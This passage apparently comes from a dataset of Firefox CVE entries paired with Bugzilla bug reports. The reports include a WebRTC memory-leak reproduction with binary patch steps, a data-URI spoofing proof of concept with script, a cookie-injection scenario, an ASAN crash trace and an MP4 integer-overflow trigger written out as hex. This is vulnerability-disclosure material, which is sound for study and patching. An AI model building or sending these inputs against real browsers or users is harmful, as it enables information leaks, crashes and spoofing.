bytes, and to assign it to |header.paddingLength|). 3. Patch the sender's code in RTPSenderVideo::Send (media\\webrtc\\trunk\\webrtc\\modules\\rtp_rtcp\\source\\rtp_sender_video.cc) lines 358-64 to use 0x20 for the outgoing packet length instead of |payload_bytes_in_packet|. To do this, replace the sequence movzx edx, word ptr [ebp-620h] ; 0f b7 95 e0 f9 ff ff push edx ; 52 with push 20h ; 6a 20 nop ; 90 nop ; 90 nop ; 90 nop ; 90 nop ; 90 nop ; 90 4. Patch out the ASSERT in CreateBoxShadow (gfx\\thebes\\gfxBlur.cpp in 445) to avoid an unrelated spurious crash due to https://bugzilla.mozilla.org/show_bug.cgi?id=1181028 and similar bugs. 5. Let execution proceed and detach the debugger from the sender. 6. Play a long video in the sender. 7. Start FF 41.0 x86 debug build with -profilemanager -no-remote. Call this session the \"receiver\". Create a new profile (\"receiver profile\"), run FF with it, and attach a debugger to it. 8. Create an FF Hello conversation in the sender. Copy the link and open it in the receiver. 9. When the conversation is connected, share the sender's tabs. 10. Watch the video trash in the receiver's tab until the receiver crashes with a read access violation. 11. Trace back the stack into ViEReceiver::OnReceivedPayloadData and note that |payload_size| is about 0xffxx. Note also that one or more pages in the range [|payload_data|, |payload_data+payload_size-1] are inaccessible, and that the crash read-access violation address is in this range. 12. Trace back the stack into RtpReceiverVideo::ParseRtpPacket and examine |payload_data_length| on line 72. Notice that it's about 0xffxx. Examine |payload_length| and notice it's 0x20, and examine |rtp_header->header.paddingLength| and notice it's > 0x20. 13. You can show that the receiver leaks information to another user by restarting the receiver and re-establishing the Hello session. Then start a third FF session with -profilemanager -no-remote, start another Hello session between the receiver and the third session, and share the receiver's tab with the third session. Notice how the trash displayed in the receiver's tab is also displayed in the third session's window. Typically the receiver displays garbage for a few seconds to a few minutes, then crashes with a read access violation, sometimes in ViEReceiver::OnReceivedPayloadData where it calls vcm_->IncomingPacket, sometimes near the end of VCMJitterBuffer::GetFrame, sometimes elsewhere."
      }
    ],
    "CVE-2015-7207": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1185256",
        "title": "performance.getEntries() shows x-domain URLs after a redirect when loading from cache",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0 Build ID: 20150630154324 Steps to reproduce: It is possible to read x-domain URLs after a redirect if the page can be iframed. What I think is a violation of the SOP and could be used to steal sensitive data from several pages. If http://victim/ redirects to http://victim/?secret an attacker can iframe the first page and obtain the \"secret\" of the second one. The exploit abuses what seems a bug in performance.getEntries() when dealing with cached pages. Details and PoC: http://vwzq.net/lab/xreadurl/ Actual results: performance.getEntries() contains the destination URL of the redirection after using history.back() and loading the page from browser's cache Expected results: performance.getEntries() should show the original URL instead of the redirection's destination"
      }
    ],
    "CVE-2015-7208": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1191423",
        "title": "allowing vertical tab in cookies leads to cookie injection on some servers",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36 Steps to reproduce: Description: Firefox allows storing vertical tabs (ASCII 11) in cookies being set. When later replayed by the browser, they can be interrupted by parser as a new line This allows setting arbitrary cookies for user. Example case: 1) User visits http://www.doyoulikepizza.com, it asks of course do you like pizza? It parses this user submited data and stores it in a cookie named likespizza. This data is cleaned for xss, or injection but allows through a vertical tab since there is no harm IE, and Chrome do not allow saving vertical tabs in cookies. This cookie is roughly stored in the jar as: likespizza:true;{vertialtab}currentsessionpassword:12345678 2) Malicious user sends link which injects value to set likespizza to create user cookie; http://www.doyoulikepizza.com?pizzaparty.php?likespizza=true;{verticaltab}currentsessionpassword:12345678; 3) Impact: When victum vists http://www.doyoulikepizza.com firefox sends the current stored cookie for doyoulikepizza.com When we visit the site we should have the vertical tab just be parsed as a regular character GET / http/1.0 Host: doyoulikepizza.com Cookie: likespizza:true;{vertialtab}currentsession:12345678 But with the middle parser Nginx / lighttp / apache / django etc might parses the vertical tab as a /n or /r so we get a, GET / http/1.0 Host: doyoulikepizza.com Cookie: likespizza:true; Cookie: currentsessionpassword:12345678; Impact Many sites facebook google etc, parse http only cookies from url or user submitted content, its an injection point for this type of exploit, the middle parser tried to be helpful but can't be trusted to properly parse the vertical tab. Suggestion: Firefox should filter non standard characters from cookie data, if other browsers do not support them then it is unlikely a developer will use these characters in cookie data, also if wanted to be used we can base64 encode the data for the cookie to keep it safe and return the characters vertical tab etc inside."
      }
    ],
    "CVE-2015-7211": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1221444",
        "title": "Partial URL spoofing using the data URI scheme",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0 Build ID: 20151014143721 Steps to reproduce: The parser that handles data uri schemes does not consider the 'hash' symbol which could lead to tricking a victim into thinking they're in a trusted website. Please view the attached PoC for a better idea of how an attack scenario would look like. new URL('data:#;,test'); //This is a valid data url, though logically it only points to 'data:' which is supposed to be blocked from access new URL('data:#');//\"TypeError: data:# is not a valid URL.\" So we can trick the browser into forming the second url using this flaw. PoC: <a href=\"data:#q;,<b>qab</b><script>location.hash=''</script>\">click</a> Actual results: We end up in 'data:#' that contains the document from the initial data: url. Expected results: The parser should not allow the hash symbol before the ',' character."
      }
    ],
    "CVE-2015-7212": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1222809",
        "title": "Memset crash in mozilla::layers::BufferTextureClient::AllocateForSurface",
        "description": "Crash Annotation GraphicsCriticalError: |[0][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32[GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32 Crash Annotation GraphicsCriticalError: |[0][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[1][GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788[GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788 Crash Annotation GraphicsCriticalError: |[0][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[1][GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788|[2][GFX1-]: Failed GetAsDrawTarget true, 0x7fd87a0f2000 + 16, Size(17895697,25), 71582788, 0[GFX1-]: Failed GetAsDrawTarget true, 0x7fd87a0f2000 + 16, Size(17895697,25), 71582788, 0 Crash Annotation GraphicsCriticalError: |[0][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[1][GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788|[2][GFX1-]: Failed GetAsDrawTarget true, 0x7fd87a0f2000 + 16, Size(17895697,25), 71582788, 0|[3][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32[GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32 Crash Annotation GraphicsCriticalError: |[0][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[1][GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788|[2][GFX1-]: Failed GetAsDrawTarget true, 0x7fd87a0f2000 + 16, Size(17895697,25), 71582788, 0|[3][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[4][GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788[GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788 Crash Annotation GraphicsCriticalError: |[0][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[1][GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788|[2][GFX1-]: Failed GetAsDrawTarget true, 0x7fd87a0f2000 + 16, Size(17895697,25), 71582788, 0|[3][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[4][GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788|[5][GFX1-]: Failed GetAsDrawTarget true, 0x7fd87a0f2000 + 16, Size(17895697,25), 71582788, 0[GFX1-]: Failed GetAsDrawTarget true, 0x7fd87a0f2000 + 16, Size(17895697,25), 71582788, 0 Crash Annotation GraphicsCriticalError: |[0][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[6][GFX1-]: BorrowDrawTarget failure, original backend 4|[2][GFX1-]: Failed GetAsDrawTarget true, 0x7fd87a0f2000 + 16, Size(17895697,25), 71582788, 0|[3][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[4][GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788|[5][GFX1-]: Failed GetAsDrawTarget true, 0x7fd87a0f2000 + 16, Size(17895697,25), 71582788, 0[GFX1-]: BorrowDrawTarget failure, original backend 4 Crash Annotation GraphicsCriticalError: |[0][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[6][GFX1-]: BorrowDrawTarget failure, original backend 4|[7][GFX1-]: Failed 2 buffer db=0x0 dw=0x0 for -3, -3, 17895697, 25|[3][GFX1-]: Attempt to create DrawTarget for invalid surface. Size(17895697,25) Cairo Status: 32|[4][GFX1-]: Failed to create DrawTarget, Type: 4 Size: Size(17895697,25), Data: 0x, Stride: 71582788|[5][GFX1-]: Failed GetAsDrawTarget true, 0x7fd87a0f2000 + 16, Size(17895697,25), 71582788, 0[GFX1-]: Failed 2 buffer db=0x0 dw=0x0 for -3, -3, 17895697, 25 ASAN:SIGSEGV ================================================================= ==11876==ERROR: AddressSanitizer: SEGV on unknown address 0x7fd8179ee000 (pc 0x7fd8fb4ad660 bp 0x7ffd8943c030 sp 0x7ffd8943b7b8 T0) #0 0x7fd8fb4ad65f in memset /build/buildd/eglibc-2.19/sysdeps/x86_64/memset.S:90 #1 0x7fd9000cc855 in mozilla::layers::BufferTextureClient::AllocateForSurface(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>, mozilla::layers::TextureAllocationFlags) gfx/layers/client/TextureClient.cpp:868:5 #2 0x7fd9000b59af in mozilla::layers::TextureClient::CreateForDrawing(mozilla::layers::CompositableForwarder*, mozilla::gfx::SurfaceFormat, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>, mozilla::layers::BackendSelector, mozilla::layers::TextureFlags, mozilla::layers::TextureAllocationFlags) gfx/layers/client/TextureClient.cpp:479:8 #3 0x7fd9000b8f07 in CreateTextureClientForDrawing gfx/layers/client/CompositableClient.cpp:214:10 #4 0x7fd9000b8f07 in mozilla::layers::ContentClientRemoteBuffer::CreateBackBuffer(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) gfx/layers/client/ContentClient.cpp:294 #5 0x7fd9000b94c3 in BuildTextureClients gfx/layers/client/ContentClient.cpp:287:3 #6 0x7fd9000b94c3 in mozilla::layers::ContentClientRemoteBuffer::CreateBuffer(gfxContentType, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, unsigned int, RefPtr<mozilla::gfx::DrawTarget>*, RefPtr<mozilla::gfx::DrawTarget>*) gfx/layers/client/ContentClient.cpp:323 #7 0x7fd8fffd7a18 in mozilla::layers::RotatedContentBuffer::BeginPaint(mozilla::layers::PaintedLayer*, unsigned int) gfx/layers/RotatedBuffer.cpp:670:5 #8 0x7fd9000e5c81 in mozilla::layers::ContentClientRemoteBuffer::BeginPaintBuffer(mozilla::layers::PaintedLayer*, unsigned int) objdir-ff-asan/dist/include/mozilla/layers/ContentClient.h:218:12 #9 0x7fd9000aa454 in mozilla::layers::ClientPaintedLayer::PaintThebes() gfx/layers/client/ClientPaintedLayer.cpp:65:5 #10 0x7fd9000ab3bf in mozilla::layers::ClientPaintedLayer::RenderLayerWithReadback(mozilla::layers::ReadbackProcessor*) gfx/layers/client/ClientPaintedLayer.cpp:141:3 #11 0x7fd9000ed9e4 in mozilla::layers::ClientContainerLayer::RenderLayer() gfx/layers/client/ClientContainerLayer.h:65:7 #12 0x7fd9000ed9e4 in mozilla::layers::ClientContainerLayer::RenderLayer() gfx/layers/client/ClientContainerLayer.h:65:7 #13 0x7fd9000a509d in mozilla::layers::ClientLayerManager::EndTransactionInternal(void (*)(mozilla::layers::PaintedLayer*, gfxContext*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) gfx/layers/client/ClientLayerManager.cpp:281:3 #14 0x7fd9000a567b in mozilla::layers::ClientLayerManager::EndTransaction(void (*)(mozilla::layers::PaintedLayer*, gfxContext*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) gfx/layers/client/ClientLayerManager.cpp:324:3 #15 0x7fd904945246 in nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) layout/base/nsDisplayList.cpp:1701:3 #16 0x7fd9049f784c in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, unsigned int) layout/base/nsLayoutUtils.cpp:3441:5 #17 0x7fd904a7b77b in PresShell::Paint(nsView*, nsRegion const&, unsigned int) layout/base/nsPresShell.cpp:6132:5 #18 0x7fd9040763c5 in nsViewManager::ProcessPendingUpdatesPaint(nsIWidget*) view/nsViewManager.cpp:466:7 #19 0x7fd90407539e in nsViewManager::ProcessPendingUpdatesForView(nsView*, bool) view/nsViewManager.cpp:397:9 #20 0x7fd904782211 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) layout/base/nsRefreshDriver.cpp:1733:5 #21 0x7fd90478b62a in TickDriver layout/base/nsRefreshDriver.cpp:196:5 #22 0x7fd90478b62a in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) layout/base/nsRefreshDriver.cpp:187 #23 0x7fd90478d174 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) layout/base/nsRefreshDriver.cpp:343:9 #24 0x7fd9050cf0e4 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) layout/ipc/VsyncChild.cpp:63:5 #25 0x7fd8ff11c260 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) objdir-ff-asan/ipc/ipdl/PVsyncChild.cpp:220:20 #26 0x7fd8fec73ebf in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) objdir-ff-asan/ipc/ipdl/PBackgroundChild.cpp:1555:16 #27 0x7fd8febe2e9b in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) ipc/glue/MessageChannel.cpp:1385:14 #28 0x7fd8febe038c in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message const&) ipc/glue/MessageChannel.cpp:1305:17 #29 0x7fd8febd2907 in mozilla::ipc::MessageChannel::OnMaybeDequeueOne() ipc/glue/MessageChannel.cpp:1276:5 #30 0x7fd8feb55a6d in RunTask ipc/chromium/src/base/message_loop.cc:364:3 #31 0x7fd8feb55a6d in MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask const&) ipc/chromium/src/base/message_loop.cc:372 #32 0x7fd8feb5673a in MessageLoop::DoWork() ipc/chromium/src/base/message_loop.cc:459:13 #33 0x7fd8febea852 in mozilla::ipc::DoWorkRunnable::Run() ipc/glue/MessagePump.cpp:220:3 #34 0x7fd8fe1f2145 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:964:7 #35 0x7fd8fe27593c in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:297:10 #36 0x7fd8febe9e6f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:127:5 #37 0x7fd8feb546d1 in RunInternal ipc/chromium/src/base/message_loop.cc:234:3 #38 0x7fd8feb546d1 in RunHandler ipc/chromium/src/base/message_loop.cc:227 #39 0x7fd8feb546d1 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:201 #40 0x7fd9040d8acf in nsBaseAppShell::Run() widget/nsBaseAppShell.cpp:156:3 #41 0x7fd906090383 in XRE_RunAppShell toolkit/xre/nsEmbedFunctions.cpp:787:12 #42 0x7fd8feb546d1 in RunInternal ipc/chromium/src/base/message_loop.cc:234:3 #43 0x7fd8feb546d1 in RunHandler ipc/chromium/src/base/message_loop.cc:227 #44 0x7fd8feb546d1 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:201 #45 0x7fd90608f8a7 in XRE_InitChildProcess toolkit/xre/nsEmbedFunctions.cpp:623:7 #46 0x4dbd14 in content_process_main(int, char**) ipc/contentproc/plugin-container.cpp:237:19 #47 0x7fd8fb442ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287"
      }
    ],
    "CVE-2015-7213": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1206211",
        "title": "Overflow in MPEG4Extractor::readMetaData causes memory-safety bug",
        "description": "MPEG4Extractor::readMetaData (media\\libstagefright\\frameworks\\av\\media\\libstagefright\\MPEG4Extractor.cpp) will experience an integer overflow with certain MP4 files. This causes the function to allocate a erroneously-small buffer, which it then overruns. The data causing the overrun comes directly from the MP4 file and is, thus, under an attacker's control. This bug currently is exploitable only on x64 versions of FF, but it might be possible to exploit it on x86 versions as well. Details ------- The bug is in lines 511-514: 511: int psshsize = 0; 512: for (size_t i = 0; i < mPssh.size(); i++) { 513: psshsize += 20 + mPssh[i].datalen; 514: } 515: if (psshsize) { 516: char *buf = (char*)malloc(psshsize); 517: char *ptr = buf; 518: for (size_t i = 0; i < mPssh.size(); i++) { 519: memcpy(ptr, mPssh[i].uuid, 20); // uuid + length 520: memcpy(ptr + 20, mPssh[i].data, mPssh[i].datalen); 521: ptr += (20 + mPssh[i].datalen); 522: } 523: mFileMetaData->setData(kKeyPssh, 'pssh', buf, psshsize); 524: free(buf); 525: } which don't check for overflow of |psshsize|. Thus, a file containing pssh boxes totalling > 4GB cause line 513 to overflow. Line 516 then allocates an erroneously-small buffer, which lines 518-522 then overrun with data extracted directly from the MP4 file. This bug is still present in today's trunk: http://hg.mozilla.org/mozilla-central/file/37c7812ce0e6/media/libstagefright/frameworks/av/media/libstagefright/MPEG4Extractor.cpp . The bug is easy to invoke. Using a binary editor, create poc_header.bin with the following data: 000: 00 00 00 1c 66 74 79 70 6d 70 34 32 00 00 00 00 010: 6d 70 34 32 69 73 6f 6d 61 76 63 31 00 00 00 84 020: 66 72 65 65 00 00 00 00 00 00 00 00 00 00 00 00 030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Then create poc_trailer.bin with this data: 000: 00 00 0d 83 6d 6f 6f 76 00 00 00 6c 6d 76 68 64 moov lmvhd 010: 00 00 00 00 c7 ca ee a7 c7 ca ee a8 00 01 5f 90 _ 020: 00 07 a5 80 00 01 00 00 01 00 00 00 00 00 00 00 030: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 040: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 050: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 @ 060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 070: 00 00 00 03 00 00 00 18 69 6f 64 73 00 00 00 00 iods 080: 10 80 80 80 07 00 4f ff ff 0f 7f ff 00 00 06 0a O 090: 74 72 61 6b 00 00 00 5c 74 6b 68 64 00 00 00 01 trak \\tkhd 0a0: c7 ca ee a7 c7 ca ee a8 00 00 00 01 00 00 00 00 0b0: 00 07 99 50 00 00 00 00 00 00 00 00 00 00 00 00 P 0c0: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 0d0: 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 0e0: 00 00 00 00 40 00 00 00 02 30 00 00 01 40 00 00 @ 0 @ 0f0: 00 00 05 a6 6d 64 69 61 00 00 00 20 6d 64 68 64 mdia mdhd 100: 00 00 00 00 c7 ca ee a7 c7 ca ee a8 00 01 5f 90 _ 110: 00 07 99 50 55 c4 00 00 00 00 00 21 68 64 6c 72 PU !hdlr 120: 00 00 00 00 00 00 00 00 76 69 64 65 00 00 00 00 vide 130: 00 00 00 00 00 00 00 00 00 00 00 05 5d 6d 69 6e ]min 140: 66 00 00 00 14 76 6d 68 64 00 00 00 01 00 00 00 f vmhd 150: 00 00 00 00 00 00 00 00 24 64 69 6e 66 00 00 00 $dinf 160: 1c 64 72 65 66 00 00 00 00 00 00 00 01 00 00 00 dref 170: 0c 75 72 6c 20 00 00 00 01 00 00 05 1d 73 74 62 url stb 180: 6c 00 00 00 ab 73 74 73 64 00 00 00 00 00 00 00 l stsd 190: 01 00 00 00 9b 61 76 63 31 00 00 00 00 00 00 00 avc1 1a0: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1b0: 00 02 30 01 40 00 48 00 00 00 48 00 00 00 00 00 0 @ H H 1c0: 00 00 01 0e 4a 56 54 2f 41 56 43 20 43 6f 64 69 JVT/AVC Codi 1d0: 6e 67 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ng 1e0: 00 00 00 00 18 ff ff 00 00 00 33 61 76 63 43 01 3avcC 1f0: 42 c0 1e ff e1 00 1b 67 42 c0 1e 9e 21 81 18 53 B gB ! S 200: 4d 40 40 40 50 00 00 03 00 10 00 00 03 03 c8 f1 M@@@P 210: 62 ee 01 00 05 68 ce 06 cb 20 00 00 00 12 63 6f b h co 220: 6c 72 6e 63 6c 63 00 01 00 01 00 01 00 00 00 18 lrnclc 230: 73 74 74 73 00 00 00 00 00 00 00 01 00 00 00 a6 stts 240: 00 00 0b b8 00 00 02 ac 73 74 73 7a 00 00 00 00 stsz 250: 00 00 00 00 00 00 00 a6 00 00 56 27 00 00 0b 20 V' 260: 00 00 05 bc 00 00 05 e2 00 00 05 c1 00 00 04 37 7 270: 00 00 04 07 00 00 03 b6 00 00 06 45 00 00 03 73 E s 280: 00 00 05 12 00 00 03 26 00 00 02 e9 00 00 03 7b & { 290: 00 00 03 4a 00 00 03 6b 00 00 02 b6 00 00 03 4c J k L 2a0: 00 00 02 7a 00 00 02 c7 00 00 02 2e 00 00 03 16 z . 2b0: 00 00 02 26 00 00 02 7f 00 00 01 ec 00 00 01 ea & 2c0: 00 00 01 f5 00 00 01 eb 00 00 01 fa 00 00 01 e7 2d0: 00 00 01 fc 00 00 01 dd 00 00 01 c6 00 00 01 ae 2e0: 00 00 01 c8 00 00 01 b9 00 00 01 90 00 00 01 93 2f0: 00 00 01 8c 00 00 01 da 00 00 01 c2 00 00 05 d0 300: 00 00 07 b8 00 00 06 7a 00 00 09 a9 00 00 0a 2c z , 310: 00 00 0a 7c 00 00 0c b3 00 00 09 8c 00 00 09 52 | R 320: 00 00 0c 04 00 00 0d c1 00 00 0f 74 00 00 10 48 t H 330: 00 00 11 06 00 00 10 61 00 00 0c 63 00 00 0c 31 a c 1 340: 00 00 0b 42 00 00 0c 0d 00 00 0f 32 00 00 0a 7b B 2 { 350: 00 00 0d 0f 00 00 0a e0 00 00 0a 0e 00 00 0b 6b k 360: 00 00 08 74 00 00 0c 36 00 00 09 e6 00 00 06 8d t 6 370: 00 00 04 f8 00 00 07 8a 00 00 07 c1 00 00 09 f3 380: 00 00 07 c7 00 00 0a cb 00 00 0a d2 00 00 0b 74 t 390: 00 00 0c 28 00 00 0a 9a 00 00 0c 60 00 00 0d 6d ( ` m 3a0: 00 00 0c 3e 00 00 0f fc 00 00 0e 82 00 00 0b 79 > y 3b0: 00 00 0d e4 00 00 0d 24 00 00 0a 17 00 00 11 aa $ 3c0: 00 00 12 65 00 00 0d 7b 00 00 12 a0 00 00 13 d8 e { 3d0: 00 00 11 49 00 00 0e 59 00 00 10 15 00 00 16 81 I Y 3e0: 00 00 09 b4 00 00 06 eb 00 00 05 ef 00 00 05 8a 3f0: 00 00 03 d7 00 00 04 0d 00 00 03 bb 00 00 04 6b k 400: 00 00 03 40 00 00 03 30 00 00 02 de 00 00 03 ae @ 0 410: 00 00 05 cf 00 00 04 6c 00 00 05 69 00 00 05 00 l i 420: 00 00 06 a1 00 00 03 35 00 00 04 1a 00 00 03 fa 5 430: 00 00 06 3d 00 00 05 d6 00 00 04 68 00 00 02 d6 = h 440: 00 00 04 b5 00 00 02 d9 00 00 02 7f 00 00 02 4d M 450: 00 00 02 7d 00 00 03 8c 00 00 02 06 00 00 02 01 } 460: 00 00 07 7f 00 00 05 ef 00 00 05 b8 00 00 04 0a 470: 00 00 02 99 00 00 03 1d 00 00 07 c5 00 00 05 ac 480: 00 00 04 78 00 00 08 71 00 00 08 99 00 00 08 e9 x q 490: 00 00 08 99 00 00 05 73 00 00 07 c7 00 00 08 3d s = 4a0: 00 00 0b 59 00 00 0a 36 00 00 06 ba 00 00 05 f9 Y 6 4b0: 00 00 07 2e 00 00 06 eb 00 00 04 c6 00 00 04 ba . 4c0: 00 00 05 66 00 00 04 31 00 00 06 8a 00 00 06 cf f 1 4d0: 00 00 06 fe 00 00 04 97 00 00 02 43 00 00 03 e2 C 4e0: 00 00 04 06 00 00 02 e6 00 00 02 6b 00 00 02 75 k u 4f0: 00 00 00 28 73 74 73 63 00 00 00 00 00 00 00 02 (stsc 500: 00 00 00 01 00 00 00 04 00 00 00 01 00 00 00 2a * 510: 00 00 00 02 00 00 00 01 00 00 00 b8 73 74 63 6f stco 520: 00 00 00 00 00 00 00 2a 00 00 00 a8 00 00 73 e6 * s 530: 00 00 8b f4 00 00 a4 08 00 00 b7 64 00 00 c8 a5 d 540: 00 00 d7 d8 00 00 e4 a5 00 00 ec 5f 00 00 f8 5f _ _ 550: 00 01 04 41 00 01 1f c3 00 01 51 85 00 01 84 7e A Q ~ 560: 00 01 cc a6 00 02 03 c0 00 02 3c 52 00 02 66 75 <R fu 570: 00 02 8a 1c 00 02 b4 a6 00 02 e7 66 00 03 23 01 f # 580: 00 03 5d ac 00 03 9e 97 00 03 ea 64 00 04 26 0a ] d & 590: 00 04 3e 69 00 04 4c ff 00 04 63 d9 00 04 7e 43 >i L c ~C 5a0: 00 04 98 9b 00 04 ad a9 00 04 be f7 00 04 d7 94 5b0: 00 04 ed 6c 00 05 0e 3b 00 05 2d c9 00 05 59 f0 l ; - Y 5c0: 00 05 7b 82 00 05 95 2b 00 05 b3 da 00 05 c6 67 { + g 5d0: 00 00 00 14 73 74 73 73 00 00 00 00 00 00 00 01 stss 5e0: 00 00 00 01 00 00 00 b2 73 64 74 70 00 00 00 00 sdtp 5f0: 04 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDD 600: 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD 610: 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD 620: 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD 630: 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD 640: 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD 650: 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD 660: 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD 670: 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD 680: 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD 690: 44 44 44 44 44 44 00 00 06 7e 74 72 61 6b 00 00 DDDDDD ~trak 6a0: 00 5c 74 6b 68 64 00 00 00 03 c7 ca ee a7 c7 ca \\tkhd 6b0: ee a8 00 00 00 02 00 00 00 00 00 07 a5 80 00 00 6c0: 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 01 6d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 6e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 @ 6f0: 00 00 00 00 00 00 00 00 00 00 00 00 06 04 6d 64 md 700: 69 61 00 00 00 20 6d 64 68 64 00 00 00 00 c7 ca ia mdhd 710: ee a7 c7 ca ee a8 00 00 bb 80 00 04 14 00 15 c7 720: 00 00 00 00 00 21 68 64 6c 72 00 00 00 00 00 00 !hdlr 730: 00 00 73 6f 75 6e 00 00 00 00 00 00 00 00 00 00 